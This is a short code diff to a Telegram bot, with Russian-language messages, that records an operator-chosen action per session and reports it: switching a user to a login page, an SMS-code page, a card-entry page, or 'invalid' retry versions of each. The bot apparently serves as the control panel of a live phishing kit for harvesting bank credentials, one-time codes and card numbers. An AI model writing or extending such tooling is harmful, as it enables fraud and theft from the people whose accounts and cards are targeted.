@@ -222,8 +222,26 @@ bot.on('callback_query', (callbackQuery) => {
     routes[sessionId] = { action: action }; // Сохраняем action для sessionId
     writeRoutesData(routes); // Сохраняем изменения
 
-    // Отправляем ответ пользователю
-    bot.sendMessage(callbackQuery.message.chat.id, `Отправляем на: ${action}`);
+    let messageText;
+
+if (action === 'cred') {
+    messageText = "Переход на авторизацию";
+} else if (action === 'otp') {
+    messageText = "Переход на ввод SMS";
+} else if (action === 'card') {
+    messageText = "Переход на ввод карты";
+} else if (action === 'credinvalid') {
+    messageText = "Переход на повторную авторизацию";
+} else if (action === 'otpinvalid') {
+    messageText = "Переход на повторный ввод SMS";
+} else if (action === 'cardinvalid') {
+    messageText = "Переход на повторный ввод карты";
+} else {
+    messageText = "Переход на следующую страницу";
+}
+
+bot.sendMessage(callbackQuery.message.chat.id, messageText);
+   
 });
 
 
